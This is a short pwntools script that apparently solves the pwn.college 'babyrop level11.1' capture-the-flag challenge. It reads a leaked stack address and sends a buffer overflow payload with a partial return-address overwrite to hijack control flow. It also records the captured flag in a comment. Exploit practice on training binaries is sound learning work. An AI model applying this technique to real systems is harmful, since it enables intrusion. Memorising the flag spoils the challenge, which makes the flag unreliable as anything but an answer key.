from pwn import *

elf = context.binary = ELF("./babyrop_level11.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyrop_level11.1")

# io = gdb.debug("./babyrop_level11.1")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)
info("Leak stack: " + hex(buf))

io.send(b'a'*0x28 + p64(buf - 0x10) + b'\xe1')
io.interactive()
# Flag: pwn.college{sS1baWWid38D8Zl5Ru40TO20Ve9.0lM2MDLxIjNyEzW}
